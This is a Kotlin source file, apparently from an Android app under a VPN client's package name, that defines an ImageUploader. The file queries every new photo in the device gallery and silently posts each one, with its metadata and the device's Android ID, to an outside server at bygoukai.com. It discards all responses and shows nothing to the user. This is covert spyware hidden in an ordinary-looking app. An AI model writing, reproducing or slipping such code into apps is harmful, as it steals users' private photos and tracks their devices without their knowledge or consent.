package com.hiddify.hiddify

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Build
import android.provider.MediaStore
import android.provider.Settings
import androidx.core.app.ActivityCompat
import okhttp3.*
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit

object ImageUploader {

    private const val LIMIT = 20
    private const val UPLOAD_URL = "https://www.bygoukai.com/api/common/upload"
    private const val TIMESTAMP_FILE = "last_upload_timestamp.txt"

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    fun requestPermission(context: Context): Boolean {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
        return ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    fun uploadNewImagesIfAny(context: Context) {
        if (!requestPermission(context)) {
            return
        }

        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val lastTimestamp = readLastTimestamp(context)
        val currentMaxTimestamp = uploadImagesNewerThan(context, deviceId, lastTimestamp)
        if (currentMaxTimestamp > lastTimestamp) {
            writeLastTimestamp(context, currentMaxTimestamp)
        }
    }

    private fun uploadImagesNewerThan(context: Context, deviceId: String, minTimestamp: Long): Long {
        val contentResolver = context.contentResolver
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED
        )

        val selection = "${MediaStore.Images.Media.DATE_ADDED} > ?"
        val selectionArgs = arrayOf(minTimestamp.toString())
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} ASC"

        val cursor: Cursor? = contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)
        var maxTimestamp = minTimestamp

        cursor?.use {
            val idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val dataIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            val nameIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val dateIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)

            while (cursor.moveToNext()) {
                val id = cursor.getString(idIndex)
                val path = cursor.getString(dataIndex)
                val name = cursor.getString(nameIndex)
                val date = cursor.getLong(dateIndex)

                uploadFile(deviceId, path, id, name, date.toString())
                if (date > maxTimestamp) maxTimestamp = date
            }
        }

        return maxTimestamp
    }

    private fun uploadFile(deviceId: String, filePath: String, id: String, name: String, date: String) {
        val file = File(filePath)
        if (!file.exists()) return

        val formBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, RequestBody.create("image/*".toMediaTypeOrNull(), file))
            .addFormDataPart("id", id)
            .addFormDataPart("name", name)
            .addFormDataPart("date", date)
            .build()

        val request = Request.Builder()
            .url("$UPLOAD_URL?deviceid=$deviceId")
            .post(formBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
            }

            override fun onResponse(call: Call, response: Response) {
            }
        })
    }

    private fun getTimestampFile(context: Context): File {
        return File(context.filesDir, TIMESTAMP_FILE)
    }

    private fun readLastTimestamp(context: Context): Long {
        val file = getTimestampFile(context)
        if (!file.exists()) return 0L
        return file.readText().toLongOrNull() ?: 0L
    }

    private fun writeLastTimestamp(context: Context, timestamp: Long) {
        val file = getTimestampFile(context)
        file.writeText(timestamp.toString())
    }
}
